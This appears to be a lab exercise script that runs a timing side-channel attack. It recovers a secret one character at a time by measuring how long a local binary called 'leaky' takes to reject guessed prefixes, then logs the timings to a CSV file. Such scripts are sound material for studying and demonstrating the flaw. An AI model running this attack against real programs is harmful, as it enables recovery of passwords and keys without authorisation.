# scripts/attack.py
import subprocess, time, statistics, string, os, sys, random, csv

BIN = os.environ.get("BIN", "../leaky")
TRIALS = int(os.environ.get("TRIALS", "7"))
ALPHABET = os.environ.get("ALPHABET", string.ascii_lowercase + string.ascii_uppercase + string.digits)
MAX_LEN = int(os.environ.get("MAX_LEN", "64"))
OUTPUT_CSV = os.environ.get("OUTPUT_CSV", "timings.csv")

def time_guess(prefix):
    start = time.perf_counter()
    res = subprocess.run([BIN, prefix], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    end = time.perf_counter()
    return (end - start), res.returncode

def best_next_char(known):
    chars = list(ALPHABET)
    random.shuffle(chars)  # reduce bias
    results = []
    for ch in chars:
        guess = known + ch
        samples = []
        for _ in range(TRIALS):
            t, _ = time_guess(guess)
            samples.append(t)
        avg = statistics.mean(sorted(samples)[1:-1]) if len(samples) >= 3 else statistics.mean(samples)
        results.append((avg, ch))
    results.sort(reverse=True)  # longest time first
    return results[0], results

def main():
    known = ""
    all_results = []

    print(f"Starting timing attack on {BIN}")
    print(f"Trials per char: {TRIALS}, Max length: {MAX_LEN}")
    print(f"Alphabet: {ALPHABET}")

    for i in range(MAX_LEN):
        (avg, ch), trial_data = best_next_char(known)
        candidate = known + ch
        t, rc = time_guess(candidate)

        print(f"{i:02d} | guess='{ch}' | avg={avg*1000:.3f}ms | rc={rc}")
        all_results.append({"pos": i, "char": ch, "avg_time_ms": avg * 1000, "return_code": rc})

        known = candidate
        if rc == 0:
            print(f"\n[+] Recovered secret: {known}")
            break

    with open(OUTPUT_CSV, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["pos", "char", "avg_time_ms", "return_code"])
        writer.writeheader()
        writer.writerows(all_results)

    print(f"Results saved to {OUTPUT_CSV}")

if __name__ == "__main__":
    main()
